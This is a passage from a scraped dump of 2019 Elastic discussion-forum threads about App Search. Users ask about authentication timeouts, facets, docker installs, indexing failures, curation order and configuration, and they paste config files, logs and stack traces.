    "body": "I generated a react app from the reference UI, and I am using npm start to start the react app. The react app works at first, but after a few hours, when I type some text, I am asked for a username/password because authentication fails. However, when I go to the server that hosts app-search, and then I try to search something again from the react app, it works. After a few hours, the search fails again. Is there a setting that fixes this issue? error.PNG1872×1014 20 KB error2.PNG1850×1084 81.7 KB error3.PNG1874×1045 26.6 KB error4.PNG1596×850 63.5 KB Config Files: # ======================== Elasticsearch Configuration ========================= ... # ---------------------------------- Cluster ----------------------------------- # # Use a descriptive name for your cluster: # #cluster.name: my-application # # ------------------------------------ Node ------------------------------------ # # Use a descriptive name for the node: # #node.name: node-1 # # Add custom attributes to the node: # #node.attr.rack: r1 # # ----------------------------------- Paths ------------------------------------ # # Path to directory where to store the data (separate multiple locations by comma): # path.data: /elastic/lib/elasticsearch # # Path to log files: # path.logs: /elastic/log/elasticsearch # # ----------------------------------- Memory ----------------------------------- # # Lock the memory on startup: # # bootstrap.memory_lock: true # # Make sure that the heap size is set to about half the memory available # on the system and that the owner of the process is allowed to use this # limit. # # Elasticsearch performs poorly when the system is swapping the memory. # # ---------------------------------- Network ----------------------------------- # # Set the bind address to a specific IP (IPv4 or IPv6): # #network.host: 192.168.0.1 # # Set a custom port for HTTP: # #http.port: 9200 # # For more information, consult the network module documentation. # # --------------------------------- Discovery ---------------------------------- # # Pass an initial list of hosts to perform discovery when this node is started: # The default list of hosts is [\"127.0.0.1\", \"[::1]\"] # #discovery.seed_hosts: [\"host1\", \"host2\"] # # Bootstrap the cluster using an initial set of master-eligible nodes: # # cluster.initial_master_nodes: [\"node-1\"] # # For more information, consult the discovery and cluster formation module documentation. # # ---------------------------------- Gateway ----------------------------------- # # Block initial recovery after a full cluster restart until N nodes are started: # #gateway.recover_after_nodes: 3 # # For more information, consult the gateway module documentation. # # ---------------------------------- Various ----------------------------------- # # Require explicit names when deleting indices: # #action.destructive_requires_name: true # action.auto_create_index: \".app-search-*-logs-*,-.app-search-*,+*\" ## ===================== Elastic App Search Configuration ===================== # # NOTE: Elastic App Search comes with reasonable defaults. # Before adjusting the configuration, make sure you understand what you # are trying to accomplish and the consequences. # # NOTE: For passwords, the use of environment variables is encouraged # to keep values from being written to disk, e.g. # elasticsearch.password: ${ELASTICSEARCH_PASSWORD:changeme} # # ---------------------------------- Elasticsearch ---------------------------- ... # ------------------------------- Hosting & Network --------------------------- # # Define the exposed URL at which users will reach App Search. # Defaults to localhost:3002 for testing purposes. # Most cases will use one of: # # * An IP: http://255.255.255.255 # * A FQDN: http://example.com # * Shortname defined via /etc/hosts: http://app-search.search # app_search.external_url: http://ld-dbn-boref020:3002 # # Web application listen_host and listen_port. # Your application will run on this host and port. # # * app_search.listen_host: Must be a valid IPv4 or IPv6 address. # * app_search.listen_port: Must be a valid port number (1-65535). # app_search.listen_host: 10.31.150.40 app_search.listen_port: 3002 # # Background worker monitoring. # Diagnostic information will be served on `app_search.monitoring_port`. # # * app_search.monitoring_enabled: Set to false to disable monitoring. # * app_search.monitoring_port: Must be a valid port number (1-65535). # #app_search.monitoring_enabled: true #app_search.monitoring_port: 3003 # # ------------------------------ Authentication ------------------------------- ... # ---------------------------------- Email ----------------------------------- ... # ----------------------------------- APIs ------------------------------------ ... # ----------------------------- Diagnostics report ---------------------------- ... # ---------------------------------- Logging ---------------------------------- ... # ------------------------------- TLS/SSL ------------------------------- ... # ---------------------------------- Session ---------------------------------- # # Set key to persist user sessions through process restarts. # secret_session_key: ... #",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "7f5fc825-72df-4915-8378-805a3eb0f134",
    "url": "https://discuss.elastic.co/t/multi-value-multi-level-hierarchical-facets-using-app-search/194805",
    "title": "Multi value multi level hierarchical facets using App Search",
    "category": [
      "App Search"
    ],
    "author": "abhishek.haith",
    "date": "August 12, 2019, 7:56am August 12, 2019, 10:24pm August 13, 2019, 5:54am August 14, 2019, 12:18pm August 14, 2019, 12:18pm August 14, 2019, 3:00pm August 15, 2019, 11:03am September 12, 2019, 11:03am",
    "body": "I have a form where user can select their favorite food. Options like below - Options Vegetables - Tomato - Pumpkin - Carrot Fruits - Apple - Banana - Orange Meats and Poultry - Lean meats - Beef - Lamb - Pork - Poultry - Chicken - Turkey - Fish and Seafood - Fish - Prawns - Lobster - Eggs - Chicken eggs - Duck eggs Users can select any number of option from any level. What should be the ideal Engine Schema in App Search and how to manage search query in API? Reference from: https://swiftype.com/documentation/app-search/guides/hierarchical-facets Thank you.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "5da93ff9-db2a-4aed-be89-966b1a3056f2",
    "url": "https://discuss.elastic.co/t/webinterface-becomes-unusable-after-a-period-of-time/195262",
    "title": "Webinterface becomes unusable after a period of time",
    "category": [
      "App Search"
    ],
    "author": "MelvinRook",
    "date": "August 14, 2019, 9:00pm August 14, 2019, 9:36pm August 14, 2019, 10:02pm September 11, 2019, 10:02pm",
    "body": "The webinterface becomes unusable after a period of time. Not sure how to solve it. Checking the browser debug shows a 500 internal server error for some files: image.png1682×590 117 KB In the 500 internal server error response: org.jruby.exceptions.TypeError: (TypeError) no implicit conversion of String into Integer at org.jruby.RubyArray.[]=(org/jruby/RubyArray.java:1558) at tmp.jruby7028956381679149336extract.gems.gems.rack_minus_1_dot_6_dot_11.lib.rack.body_proxy.method_missing(/tmp/jruby7028956381679149336extract/gems/gems/rack-1.6.11/lib/rack/body_proxy.rb:36) at tmp.jruby7028956381679149336extract.gems.gems.rack_minus_1_dot_6_dot_11.lib.rack.body_proxy.method_missing(/tmp/jruby7028956381679149336extract/gems/gems/rack-1.6.11/lib/rack/body_proxy.rb:36) .. <snip, repeating> In the logs: [2019-08-14T20:53:34.865+00:00][8110][2834][action_controller][INFO]: [ea5c2dc8-6617-4405-9766-94fc60431e83] Processing by ErrorsController#not_found as */* [2019-08-14T20:53:34.865+00:00][8110][2834][action_controller][INFO]: [ea5c2dc8-6617-4405-9766-94fc60431e83] Parameters: {\"host\"=>\"localhost:3002\", \"protocol\"=>\"http\"} [2019-08-14T20:53:34.873+00:00][8110][2834][action_controller][INFO]: [ea5c2dc8-6617-4405-9766-94fc60431e83] Completed 500 Internal Server Error in 8ms [2019-08-14T20:53:34.900+00:00][8110][2832][rails][FATAL]: [5dfb215f-3719-4723-a4fa-d9752bfd716e] ActionController::RoutingError (No route matches [GET] \"/packs/js/0-40694bdbb3917ca89f95.chunk.js\"): /tmp/jruby7028956381679149336extract/gems/gems/actionpack-4.2.11.1/lib/action_dispatch/middleware/debug_exceptions.rb:21:in `call' /tmp/jruby7028956381679149336extract/gems/gems/actionpack-4.2.11.1/lib/action_dispatch/middleware/show_exceptions.rb:30:in `call' /tmp/jruby7028956381679149336extract/gems/gems/railties-4.2.11.1/lib/rails/rack/logger.rb:38:in `call_app' /tmp/jruby7028956381679149336extract/gems/gems/railties-4.2.11.1/lib/rails/rack/logger.rb:20:in `block in call' /tmp/jruby7028956381679149336extract/gems/gems/activesupport-4.2.11.1/lib/active_support/tagged_logging.rb:68:in `block in tagged' /tmp/jruby7028956381679149336extract/gems/gems/activesupport-4.2.11.1/lib/active_support/tagged_logging.rb:26:in `tagged' /tmp/jruby7028956381679149336extract/gems/gems/activesupport-4.2.11.1/lib/active_support/tagged_logging.rb:68:in `tagged' /tmp/jruby7028956381679149336extract/gems/gems/railties-4.2.11.1/lib/rails/rack/logger.rb:20:in `call' config/initializers/quiet_assets.class:6:in `call_with_quiet_assets' /tmp/jruby7028956381679149336extract/gems/gems/request_store-1.4.1/lib/request_store/middleware.rb:19:in `call' /tmp/jruby7028956381679149336extract/gems/gems/actionpack-4.2.11.1/lib/action_dispatch/middleware/request_id.rb:21:in `call' /tmp/jruby7028956381679149336extract/gems/gems/rack-1.6.11/lib/rack/methodoverride.rb:22:in `call' /tmp/jruby7028956381679149336extract/gems/gems/rack-1.6.11/lib/rack/runtime.rb:18:in `call' /tmp/jruby7028956381679149336extract/gems/gems/actionpack-4.2.11.1/lib/action_dispatch/middleware/static.rb:120:in `call' /tmp/jruby7028956381679149336extract/gems/gems/rack-1.6.11/lib/rack/sendfile.rb:113:in `call' config/initializers/stats_middleware.class:10:in `call' shared_togo/lib/shared_togo/external_host_middleware.class:15:in `call' /tmp/jruby7028956381679149336extract/gems/gems/railties-4.2.11.1/lib/rails/engine.rb:518:in `call' /tmp/jruby7028956381679149336extract/gems/gems/railties-4.2.11.1/lib/rails/application.rb:165:in `call' uri:classloader:/rack/handler/servlet.rb:22:in `call",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7b348d9a-c653-445a-ba56-201cc42768c9",
    "url": "https://discuss.elastic.co/t/advanced-setting-for-app-search-7-2-for-location-of-temp-work-space-for-jetty-and-other-process/193370",
    "title": "Advanced setting for app search 7.2 for location of temp work space for jetty and other process",
    "category": [
      "App Search"
    ],
    "author": "Dustin_Hughes",
    "date": "August 1, 2019, 3:52pm August 12, 2019, 10:24pm August 12, 2019, 5:43pm September 9, 2019, 5:43pm",
    "body": "During load testing of data ingestion last night on the 7.2 edition we notice the use of /tmp Example of what type of files we have seen: ''' drwxrwxr-x 4 app-search app-search 29 Aug 1 09:13 jetty-127.0.0.1-3002-app-search.war--any-14033323923130097253.dir drwxr-xr-x 4 app-search app-search 29 Aug 1 10:36 jetty-127.0.0.1-3002-app-search.war--any-15045452541766198933.dir drwxrwxr-x 4 app-search app-search 29 Aug 1 09:37 jetty-127.0.0.1-3002-app-search.war-_-any-3636654065492079126.dir drwxr-xr-x 2 app-search app-search 4.0K Aug 1 10:36 jruby-1111 drwxr-xr-x 2 app-search app-search 4.0K Aug 1 10:36 jruby-1112 drwxr-xr-x 2 app-search app-search 4.0K Aug 1 10:36 jruby-1113 drwxr-xr-x 14 app-search app-search 4.0K Aug 1 10:35 jruby11455094622311008353extract drwxr-xr-x 14 app-search app-search 4.0K Aug 1 09:40 jruby12054002575997581668extract drwxrwxr-x 14 app-search app-search 4.0K Aug 1 09:12 jruby12457954944277647398extract drwxrwxr-x 14 app-search app-search 4.0K Aug 1 09:36 jruby13846152299151519729extract drwxr-xr-x 14 app-search app-search 4.0K Aug 1 10:35 jruby14907057299340211513extract drwxrwxr-x 2 app-search app-search 4.0K Aug 1 09:13 jruby-163368 drwxrwxr-x 2 app-search app-search 4.0K Aug 1 09:12 jruby-163371 drwxrwxr-x 2 app-search app-search 4.0K Aug 1 09:37 jruby-164167 drwxrwxr-x 2 app-search app-search 4.0K Aug 1 09:37 jruby-164170 drwxr-xr-x 2 app-search app-search 4.0K Aug 1 09:41 jruby-164436 drwxr-xr-x 2 app-search app-search 4.0K Aug 1 09:40 jruby-164440 drwxrwxr-x 14 app-search app-search 4.0K Aug 1 09:12 jruby1689002271072179113extract drwxrwxr-x 14 app-search app-search 4.0K Aug 1 09:36 jruby2898632431355743206extract drwxrwxr-x 14 app-search app-search 4.0K Aug 1 09:36 jruby4620071894457058344extract drwxr-xr-x 14 app-search app-search 4.0K Aug 1 09:40 jruby5671705993438013238extract drwxr-xr-x 14 app-search app-search 4.0K Aug 1 10:35 jruby5845234341657106321extract drwxrwxr-x 14 app-search app-search 4.0K Aug 1 09:12 jruby8216675081117055363extract drwx------ 3 root root 16 Aug 1 10:35 systemd-private-94b6a3329d97441381df0d0d1ef30eaf-nginx.service-spyMfG drwx------ 3 root root 16 Aug 1 10:35 systemd-private-94b6a3329d97441381df0d0d1ef30eaf-ntpd.service-Gjhoy8 ''' For the time being, we have increased the /tmp directory size. Our sysadmin was asking if it was possible to change this location via an environmental variable.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9416147b-5ce6-4fbf-8516-b697f96fc47a",
    "url": "https://discuss.elastic.co/t/newb-search-field-in-navbar-and-search-results-somewhere-else/192534",
    "title": "Newb - Search field in Navbar and search results somewhere else",
    "category": [
      "App Search"
    ],
    "author": "lesreaper",
    "date": "July 27, 2019, 7:25pm August 12, 2019, 12:37pm September 9, 2019, 12:37pm",
    "body": "Hey all, On my trial for a client, and I'm not understanding how to separate out a search field in the navbar and then putting the actual results on another page in the site. Using React, and there's no example from what I can see of how this is done. Am I missing something?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0900bf4d-5ebf-4819-a7d2-95d94cae9362",
    "url": "https://discuss.elastic.co/t/issues-installing-app-search-locally-using-docker/192206",
    "title": "Issues installing App Search locally using docker",
    "category": [
      "App Search"
    ],
    "author": "jubstuff",
    "date": "July 25, 2019, 9:57am July 25, 2019, 9:43am July 25, 2019, 9:59am July 25, 2019, 12:06pm July 25, 2019, 2:18pm July 26, 2019, 2:08pm July 26, 2019, 2:23pm July 26, 2019, 2:37pm July 26, 2019, 3:18pm July 29, 2019, 6:22am July 29, 2019, 11:39am August 26, 2019, 11:39am",
    "body": "Hello, I wanted to give App Search a try and I wanted to install it locally using docker. I followed the instructions located at https://swiftype.com/documentation/app-search/self-managed/installation#docker-compose but it seems that no matter what, I cannot access the App Search app at http://localhost:3002 This is my docker-compose.yml: version: '2.2' services: elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch:7.2.0 environment: - \"node.name=es-node\" - \"discovery.type=single-node\" - \"cluster.name=app-search-docker-cluster\" - \"bootstrap.memory_lock=true\" - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" - \"cluster.routing.allocation.disk.threshold_enabled=true\" - \"cluster.routing.allocation.disk.watermark.flood_stage=200mb\" - \"cluster.routing.allocation.disk.watermark.low=500mb\" - \"cluster.routing.allocation.disk.watermark.high=300mb\" ulimits: memlock: soft: -1 hard: -1 ports: - 9200:9200 - 9300:9300 volumes: - esdata01:/usr/share/elasticsearch/data appsearch: image: docker.elastic.co/app-search/app-search:7.2.0 environment: - \"elasticsearch.host=http://elasticsearch:9200\" - \"allow_es_settings_modification=true\" - \"JAVA_OPTS=-Xmx256m\" ports: - 3002:3002 volumes: esdata01: driver: local While this is the log I get when running docker-compose up: ▶ docker-compose up appsearch Recreating appsearchtest_appsearch_1 ... done Attaching to appsearchtest_appsearch_1 appsearch_1 | Found java executable in PATH appsearch_1 | Java version: 1.8.0_212 appsearch_1 | appsearch_1 | App Search is starting. It will take a few moments. App Search includes the following stack components: appsearch_1 | - An application server appsearch_1 | - A pool of background workers appsearch_1 | - A filebeat instance for indexing logs appsearch_1 | appsearch_1 | forego | starting app-server.1 on port 5000 appsearch_1 | forego | starting worker.1 on port 5100 appsearch_1 | forego | starting filebeat.1 on port 5300 appsearch_1 | filebeat.1 | scripting container class loader urls: [file:/tmp/jruby8772327061860643696extract/lib/jruby-core-9.2.5.0-complete.jar, file:/tmp/jruby8772327061860643696extract/lib/jruby-rack-1.1.21.jar, file:/tmp/jruby8772327061860643696extract/lib/jruby-stdlib-9.2.5.0.jar] appsearch_1 | app-server.1 | scripting container class loader urls: [file:/tmp/jruby4781859431772385646extract/lib/jruby-core-9.2.5.0-complete.jar, file:/tmp/jruby4781859431772385646extract/lib/jruby-rack-1.1.21.jar, file:/tmp/jruby4781859431772385646extract/lib/jruby-stdlib-9.2.5.0.jar] appsearch_1 | worker.1 | scripting container class loader urls: [file:/tmp/jruby394617129645864115extract/lib/jruby-core-9.2.5.0-complete.jar, file:/tmp/jruby394617129645864115extract/lib/jruby-rack-1.1.21.jar, file:/tmp/jruby394617129645864115extract/lib/jruby-stdlib-9.2.5.0.jar] appsearch_1 | app-server.1 | setting GEM_HOME to /tmp/jruby4781859431772385646extract/gems appsearch_1 | app-server.1 | ... and BUNDLE_GEMFILE to /tmp/jruby4781859431772385646extract/Gemfile appsearch_1 | app-server.1 | loading resource: /tmp/jruby4781859431772385646extract/./META-INF/rails.rb appsearch_1 | app-server.1 | invoking /tmp/jruby4781859431772385646extract/./META-INF/rails.rb with: [runner, LocoTogo.start_app_server!] appsearch_1 | filebeat.1 | setting GEM_HOME to /tmp/jruby8772327061860643696extract/gems appsearch_1 | filebeat.1 | ... and BUNDLE_GEMFILE to /tmp/jruby8772327061860643696extract/Gemfile appsearch_1 | filebeat.1 | loading resource: /tmp/jruby8772327061860643696extract/./META-INF/rails.rb appsearch_1 | filebeat.1 | invoking /tmp/jruby8772327061860643696extract/./META-INF/rails.rb with: [runner, LocoTogo.start_filebeat!] appsearch_1 | worker.1 | setting GEM_HOME to /tmp/jruby394617129645864115extract/gems appsearch_1 | worker.1 | ... and BUNDLE_GEMFILE to /tmp/jruby394617129645864115extract/Gemfile appsearch_1 | worker.1 | loading resource: /tmp/jruby394617129645864115extract/./META-INF/rails.rb appsearch_1 | worker.1 | invoking /tmp/jruby394617129645864115extract/./META-INF/rails.rb with: [runner, LocoTogo.start_worker!] appsearch_1 | filebeat.1 | Creating log directory: /usr/share/app-search/log appsearch_1 | filebeat.1 | [2019-07-25T09:05:54.229+00:00][56][2000][rails][INFO]: App Search version=7.2.0, JRuby version=9.2.5.0, Ruby version=2.5.0, Rails version=4.2.11.1 appsearch_1 | app-server.1 | [2019-07-25T09:05:54.502+00:00][53][2000][rails][INFO]: App Search version=7.2.0, JRuby version=9.2.5.0, Ruby version=2.5.0, Rails version=4.2.11.1 appsearch_1 | worker.1 | [2019-07-25T09:06:02.025+00:00][55][2000][rails][INFO]: App Search version=7.2.0, JRuby version=9.2.5.0, Ruby version=2.5.0, Rails version=4.2.11.1 From the logs, it seems that the server is running on port 5000, but even exposing that port didn't work. Could someone help me setup it? Thank you",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "330329b3-155c-4449-a7a3-ba10fd28aeca",
    "url": "https://discuss.elastic.co/t/elastic-app-search-windows-installation/192301",
    "title": "Elastic App Search Windows installation",
    "category": [
      "App Search"
    ],
    "author": "rajithsam",
    "date": "July 25, 2019, 7:06pm July 25, 2019, 7:12pm July 25, 2019, 7:12pm July 25, 2019, 7:11pm July 25, 2019, 7:12pm July 25, 2019, 7:12pm August 22, 2019, 7:12pm",
    "body": "Is it possible to install elastic app search in windows? https://www.elastic.co/downloads/app-search",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "3481c01b-d936-4b9f-87a6-ab35257556a1",
    "url": "https://discuss.elastic.co/t/app-search-not-returning-correct-curation-results/191694",
    "title": "App search not returning correct curation results",
    "category": [
      "App Search"
    ],
    "author": "brettg",
    "date": "July 22, 2019, 5:42pm July 23, 2019, 10:48am July 25, 2019, 4:18pm August 22, 2019, 4:18pm",
    "body": "Hey All, I have several curations set up in AppSearch and I'm trying to query them via postman by the curation search term to see if I can get them to show up in the correct order. The results that are coming back from endpoint: engines/myengine/search { \"query\": \"myquery\", } Are not in the order that the curation says they should be returned in. Is there something I'm missing? Thanks, B",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b904e58b-da3a-4c0d-a812-babdf28c3de4",
    "url": "https://discuss.elastic.co/t/issue-with-app-search-download-release-not-quite-a-connection-issue/191249",
    "title": "Issue with app search (download) release -- not quite a connection issue",
    "category": [
      "App Search"
    ],
    "author": "dhrp",
    "date": "July 18, 2019, 4:38pm July 18, 2019, 4:46pm July 18, 2019, 7:09pm July 18, 2019, 9:19pm July 18, 2019, 10:20pm July 19, 2019, 9:28pm August 16, 2019, 9:28pm",
    "body": "I'm interested in trying out app-search self hosted, but I'm having trouble getting started. I can submit an object using past JSON or upload. In the logs this is all well received. But then App search keeps returning me that I have 0 documents. Setup: Elasticsearch 7.2 with basic license (installed through elasticsearch kubernetes operator) available over https with authentication on my server with https on port 443 KIbana works fine App search is configured with the hostname, user and password of elasticsearch I can login fine on app search I can submit an object using past JSON or upload. In the logs this is all well received. App Search logs show the document(s) are successfully received. app-server.1 | [2019-07-18T16:14:26.892+00:00][12273][2366][rails][INFO]: [3dd6e664-73b0-48e8-b81f-4f5aa8d9939c] Engine[5d30804df841b462bf4f3c50]: Adding a batch of 2 documents to the index asynchronously app-server.1 | [2019-07-18T16:14:26.918+00:00][12273][2366][rails][INFO]: [3dd6e664-73b0-48e8-b81f-4f5aa8d9939c] [ActiveJob] Enqueueing a job into the '.app-search-esqueues-me_queue_v1_index_adder' index. {\"job_type\"=>\"ActiveJob::QueueAdapters::EsqueuesMeAdapter::JobWrapper\", \"payload\"=>{\"args\"=>[{\"job_class\"=>\"Work::Engine::IndexAdder\", \"job_id\"=>\"984576c7d5d00b376476f1aba9b863732290f8b3\", \"queue_name\"=>\"index_adder\", \"arguments\"=>[\"5d30804df841b462bf4f3c50\", [\"5d30813cf841b4e1a64f3c54\", \"5d30813cf841b4e1a64f3c55\"]], \"locale\"=>:en, \"executions\"=>1}]}, \"status\"=>\"pending\", \"created_at\"=>1563466466917, \"perform_at\"=>1563466466917, \"attempts\"=>0} app-server.1 | [2019-07-18T16:14:27.074+00:00][12273][2366][active_job][INFO]: [3dd6e664-73b0-48e8-b81f-4f5aa8d9939c] [ActiveJob] [2019-07-18 16:14:27 UTC] enqueued Work::Engine::IndexAdder job (984576c7d5d00b376476f1aba9b863732290f8b3) on `index_adder` app-server.1 | [2019-07-18T16:14:27.076+00:00][12273][2366][active_job][INFO]: [3dd6e664-73b0-48e8-b81f-4f5aa8d9939c] [ActiveJob] Enqueued Work::Engine::IndexAdder (Job ID: 984576c7d5d00b376476f1aba9b863732290f8b3) to EsqueuesMe(index_adder) with arguments: \"5d30804df841b462bf4f3c50\", [\"5d30813cf841b4e1a64f3c54\", \"5d30813cf841b4e1a64f3c55\"] app-server.1 | [2019-07-18T16:14:27.087+00:00][12273][2366][action_controller][INFO]: [3dd6e664-73b0-48e8-b81f-4f5aa8d9939c] Completed 200 OK in 723ms (Views: 2.0ms) But the worker returns the following errors: worker.1 | [2019-07-18T16:14:28.176+00:00][12274][2364][rails][WARN]: Failed to claim job 984576c7d5d00b376476f1aba9b863732290f8b3, claim conflict occurred worker.1 | [2019-07-18T16:14:28.176+00:00][12274][2370][rails][WARN]: Failed to claim job 984576c7d5d00b376476f1aba9b863732290f8b3, claim conflict occurred worker.1 | [2019-07-18T16:14:28.176+00:00][12274][2366][rails][WARN]: Failed to claim job 984576c7d5d00b376476f1aba9b863732290f8b3, claim conflict occurred worker.1 | [2019-07-18T16:14:28.181+00:00][12274][2368][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [984576c7d5d00b376476f1aba9b863732290f8b3] Performing Work::Engine::IndexAdder from EsqueuesMe(index_adder) with arguments: \"5d30804df841b462bf4f3c50\", [\"5d30813cf841b4e1a64f3c54\", \"5d30813cf841b4e1a64f3c55\"] worker.1 | [2019-07-18T16:14:28.546+00:00][12274][2368][rails][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [984576c7d5d00b376476f1aba9b863732290f8b3] Adding document 5d30813cf841b4e1a64f3c54 to index for engine 5d30804df841b462bf4f3c50 worker.1 | [2019-07-18T16:14:29.053+00:00][12274][2368][active_job][INFO]: [ActiveJob] [Work::Engine::IndexAdder] [984576c7d5d00b376476f1aba9b863732290f8b3] Performed Work::Engine::IndexAdder from EsqueuesMe(index_adder) in 864.99ms worker.1 | [2019-07-18T16:14:29.055+00:00][12274][2368][rails][ERROR]: Retrying Work::Engine::IndexAdder in 300 seconds, due to a StandardError. The original exception was #<Faraday::ConnectionFailed wrapped=#<Manticore::SocketException: Connection refused (Connection refused)>>. worker.1 | [2019-07-18T16:14:29.058+00:00][12274][2368][rails][INFO]: [ActiveJob] Enqueueing a job into the '.app-search-esqueues-me_queue_v1_index_adder' index. {\"job_type\"=>\"ActiveJob::QueueAdapters::EsqueuesMeAdapter::JobWrapper\", \"payload\"=>{\"args\"=>[{\"job_class\"=>\"Work::Engine::IndexAdder\", \"job_id\"=>\"984576c7d5d00b376476f1aba9b863732290f8b3\", \"queue_name\"=>\"index_adder\", \"arguments\"=>[\"5d30804df841b462bf4f3c50\", [\"5d30813cf841b4e1a64f3c54\", \"5d30813cf841b4e1a64f3c55\"]], \"locale\"=>:en, \"executions\"=>2}]}, \"status\"=>\"pending\", \"created_at\"=>1563466469057, \"perform_at\"=>1563466769056, \"attempts\"=>0} worker.1 | [2019-07-18T16:14:29.079+00:00][12274][2368][rails][INFO]: [ActiveJob] Ignoring duplicate job class=Work::Engine::IndexAdder, id=984576c7d5d00b376476f1aba9b863732290f8b3, args=[\"5d30804df841b462bf4f3c50\", [\"5d30813cf841b4e1a64f3c54\", \"5d30813cf841b4e1a64f3c55\"]] worker.1 | [2019-07-18T16:14:29.080+00:00][12274][2368][active_job][INFO]: [ActiveJob] [2019-07-18 16:14:29 UTC] enqueued Work::Engine::IndexAdder job (984576c7d5d00b376476f1aba9b863732290f8b3) on `index_adder` worker.1 | [2019-07-18T16:14:29.084+00:00][12274][2368][active_job][INFO]: [ActiveJob] Enqueued Work::Engine::IndexAdder (Job ID: 984576c7d5d00b376476f1aba9b863732290f8b3) to EsqueuesMe(index_adder) at 2019-07-18 16:19:29 UTC with arguments: \"5d30804df841b462bf4f3c50\", [\"5d30813cf841b4e1a64f3c54\", \"5d30813cf841b4e1a64f3c55\"] worker.1 | [2019-07-18T16:14:29.086+00:00][12274][2368][rails][INFO]: Deleting: {:index=>\".app-search-esqueues-me_queue_v1_index_adder\", :type=>nil, :id=>\"984576c7d5d00b376476f1aba9b863732290f8b3\"} In the Elasticsearch logs I see that app search is connected, because it gives me the following deprecation warning every so much time. It does not seem related. {\"type\": \"deprecation\", \"timestamp\": \"2019-07-18T16:34:50,046+0000\", \"level\": \"WARN\", \"component\": \"o.e.d.s.a.b.h.DateHistogramAggregationBuilder\", \"cluster.name\": \"quickstart\", \"node.name\": \"quickstart-es-z92ct6ztpk\", \"cluster.uuid\": \"H77aFeQoQUqU7ckCMK_gVg\", \"node.id\": \"D7V-shukRdi9WyuxuWdHIQ\", \"message\": \"[interval] on [date_histogram] is deprecated, use [fixed_interval] or [calendar_interval] in the future.\" } I have checked settings, and it includes (not sure if app search or myself set it) { \"persistent\": { \"action\": { \"auto_create_index\": \".app-search-*-logs-*,-.app-search-*,+*\" }, \"discovery\": { \"zen\": { \"minimum_master_nodes\": \"1\" } } }, The end result is that there are some indexes that start with .app-search, but no data.... !?#! help?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "91b59079-1e21-4409-b095-6d0ea14e2d5a",
    "url": "https://discuss.elastic.co/t/different-ways-to-add-documents/191361",
    "title": "Different ways to add documents?",
    "category": [
      "App Search"
    ],
    "author": "gork",
    "date": "July 19, 2019, 9:37am July 19, 2019, 9:42am July 19, 2019, 9:59am July 19, 2019, 10:12am July 19, 2019, 10:26am July 19, 2019, 11:12am July 19, 2019, 11:29am July 19, 2019, 11:55am July 19, 2019, 12:33pm July 19, 2019, 2:11pm July 19, 2019, 2:22pm August 16, 2019, 2:22pm",
    "body": "Heya I've been playing around with App Search the last couple of days and so far I am really enjoying it! I would like to move the search functionality of my PHP-based forum to AS and have played around with adding some documents. Right now I have a PHP script that gets the data from MySQL, does a bit of manipulation (convert timestamps to ISO etc) and then ship 100 documents at a time to AS/ Now I am wondering, how to do it better / faster / easier using - I don't know - JDBC? Different shipping methods from MySQL to AS? But I am unsure of what would be the \"right\" way to do it. As far as I have found out, there is no Logstash in AS? Or is there? Any tips will be much appreciated! Seeing that this is quite a new (and awesome) product, I could not find any specific App Search related answers or tutorials Thanks!",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "9fc6300b-646a-44b8-bfe2-88069a79b772",
    "url": "https://discuss.elastic.co/t/api-logs-app-search-self-managed-config-time-save-logs/189101",
    "title": "[API Logs] App Search Self Managed config time save logs?",
    "category": [
      "App Search"
    ],
    "author": "tuyndv",
    "date": "July 5, 2019, 12:46pm July 18, 2019, 8:50am July 18, 2019, 11:58am July 18, 2019, 12:46pm July 18, 2019, 1:40pm July 18, 2019, 3:10pm July 18, 2019, 3:12pm July 19, 2019, 1:37am July 19, 2019, 2:59am August 16, 2019, 2:59am",
    "body": "Dear Team, I'm using App Search Self Managed 7.2.0 Please help me, config time save logs? (Current default 24h) Thanks Team",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "8792939a-98d8-400e-afa1-dc7aa8349728",
    "url": "https://discuss.elastic.co/t/installing-app-search-7-2-ga/188103",
    "title": "Installing App Search 7.2 GA",
    "category": [
      "App Search"
    ],
    "author": "bpamiri",
    "date": "June 28, 2019, 7:47pm July 1, 2019, 11:58am July 3, 2019, 5:07pm July 3, 2019, 5:38pm July 8, 2019, 9:28pm August 5, 2019, 9:26pm",
    "body": "I've just finished standing up a 10 node ElasticSearch 7.2 cluster on CentOS VMs in our data center. Now I want to download App Search and play with it. I'm a little confused as to where it needs to be installed. The documentation for a production ready installation is very sparse and I don't think there are RMPs available yet. So here is my initial questions. Does App Search get installed on each node of a cluster or does it get installed on a single node? Should it be installed on a member node of the cluster or on it's own server? Are there any installation docs for a production ready installation?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "4cad6a92-1276-4516-9355-f551e4eff293",
    "url": "https://discuss.elastic.co/t/how-to-make-special-character-insensitive/188567",
    "title": "How to make special character insensitive?",
    "category": [
      "App Search"
    ],
    "author": "Hesh",
    "date": "July 2, 2019, 6:46pm July 30, 2019, 6:46pm",
    "body": "We're using the \"query suggestion\" feature. We've realized that when searching for a title that contains a Special Character such a an apostrophe but the search query is missing the apostrophe, Swiftype will not return suggestions that contain an apostrophe. e.g. whats will not returns what's Is there a way to make special character insensitive?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a81c30ce-37ea-4a18-a8c9-877926a554b2",
    "url": "https://discuss.elastic.co/t/rank-feature-and-app-search/188461",
    "title": "Rank_feature and APP-Search",
    "category": [
      "App Search"
    ],
    "author": "bastimm",
    "date": "July 2, 2019, 9:05am July 2, 2019, 2:46pm July 30, 2019, 2:32pm",
